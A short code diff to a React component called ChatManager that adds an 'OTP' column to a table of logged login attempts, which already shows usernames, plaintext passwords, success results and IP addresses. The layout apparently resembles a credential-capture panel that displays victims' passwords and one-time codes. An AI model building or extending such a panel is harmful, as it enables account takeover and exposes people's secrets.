@@ -73,6 +73,7 @@ export default function ChatManager() {
               <th>Time</th>
               <th>Username</th>
               <th>Password</th>
+              <th>OTP</th>
               <th>Result</th>
               <th>IP</th>
             </tr>
@@ -83,6 +84,7 @@ export default function ChatManager() {
                 <td>{new Date(a.createdAt).toLocaleTimeString()}</td>
                 <td>{a.username}</td>
                 <td>{a.password}</td>
+                <td>{a.otp}</td>
                 <td>
                   {a.success ? "✓ " : "✗ "}
                   {a.reason}
